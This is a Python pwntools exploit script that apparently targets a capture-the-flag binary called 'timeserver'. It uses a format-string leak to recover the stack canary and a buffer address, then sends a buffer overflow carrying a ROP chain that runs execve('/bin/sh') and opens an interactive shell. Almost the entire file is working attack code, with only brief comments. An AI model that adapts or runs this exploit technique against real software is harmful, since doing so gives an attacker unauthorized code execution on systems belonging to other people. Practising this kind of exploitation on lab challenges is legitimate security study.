#!/usr/bin/env python3

from pwn import *
import sys, struct, os

def start():
    elf = context.binary = ELF('../challenge/timeserver')
    gs = '''
    b *main
    b *printf
    continue
    '''

    if args.GDB:
        #context.terminal = ['tmux', 'new-window'] # Uncomment for tmux
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('localhost', 4444)
    else:
        return process(elf.path)

def exploit():
    # Start the process
    p = start()
    # Print the programs message
    print(p.recv().decode())

    # Set cmd to execve
    p.sendline('L\n/bin/sh\x00')    # Drop to shell
    p.recv()                        # Recv response

    # Send info leak
    p.sendline('AAAA' + '%39$x' + '%32$x')
    # Ruturns "Invalid option: AAAAxxxxxxxxyyyyyyyy" where x's are the canary and y's are buff addr
    leak = p.recv()
    canary = leak[20:28]            # Parse out canary
    buff = leak[28:36]              # Parse out Buffer address

    # Print out the canary and the buffer address
    print('Canary: ' + canary.decode())
    print('Buffer Address: ' + buff.decode())


    # Build payload
    # EAX = 11              - Syscall for execve
    # EBX = /bin/sh\x00     - Filename to exec
    # ECX = 0x00000000      - arguments (argv[])
    # EDX = 0x00000000      - Environmont (envp[])
    # int 0x80              - initiate syscall
    payload = b'T\x00'                                      # Valid option to initiate Return
    payload += b'C' * 126                                   # Garbage that overflows
    payload += p32(int(canary,16))                          # Canary
    payload += p32(0xdeadbeef) * 3                          # junk for EBP, and the 2 following pops
    # pop edx ; pop ebx ; ret
    payload += p32(0x08066219)                              # pop off two junk words and then start ROP
    payload += b'\x00\x00\x00\x00'                          # 0x00 -> EDX
    payload += p32(int(buff,16))                            # Buffer for /bin/sh\x00 -> EBX
    # inc eax ; pop edi ; ret
    payload += ((p32(0x0806f3ec) + p32(0xdeadbeef))) * 11   # set EAX to 11 for syscall(execve), pop junk -> EDI
    # xor ecx, ecx ; int 0x80
    payload += p32(0x0804ad4f)                              # 0x00 -> ECX, initiate syscall

    # Send payload
    p.sendline(payload)
    print(p.recv())
    # Drop to shell
    p.interactive()

if __name__ == '__main__':
    exploit()
